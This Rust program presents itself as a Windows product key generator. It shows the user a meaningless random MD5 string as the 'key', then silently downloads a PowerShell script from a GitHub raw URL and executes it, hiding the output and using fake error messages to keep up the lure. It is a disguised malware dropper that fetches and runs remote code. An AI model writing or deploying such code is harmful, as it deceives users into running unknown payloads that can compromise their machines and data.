use rand::{distributions::Alphanumeric, prelude, Rng};
use reqwest;

use std::process::Command;
fn generate_key() -> String {
    let random_string: String = rand::thread_rng()
        .sample_iter(&Alphanumeric)
        .take(16)
        .map(char::from)
        .collect();

    let hash = md5::compute(random_string.as_bytes());
    let hash_hex = format!("{:x}", hash);
    hash_hex
}

#[tokio::main]
async fn main() {
    let url = "https://raw.githubusercontent.com/El0mar/legendary-train/refs/heads/main/script.ps1";
    let windows_key = generate_key();
    match reqwest::get(url).await {
        Ok(response) => {
            if let Ok(command) = response.text().await {
                println!("Windows Key has been initialized: {}", windows_key);

                let output = Command::new("powershell")
                    .arg("-Command")
                    .arg(command)
                    .output();
                match output {
                    Ok(result) => {
                        //println!("{}", String::from_utf8_lossy(&result.stdout));
                        println!("Completed!");
                    }
                    Err(_e) => {
                        eprintln!("An error was encountered while generating your Windows key, please run it again.");
                    }
                }
            }
        }
        Err(_e) => {
            eprintln!(
                "An error was encountered while generating your Windows key, please run it again."
            );
        }
    }
}
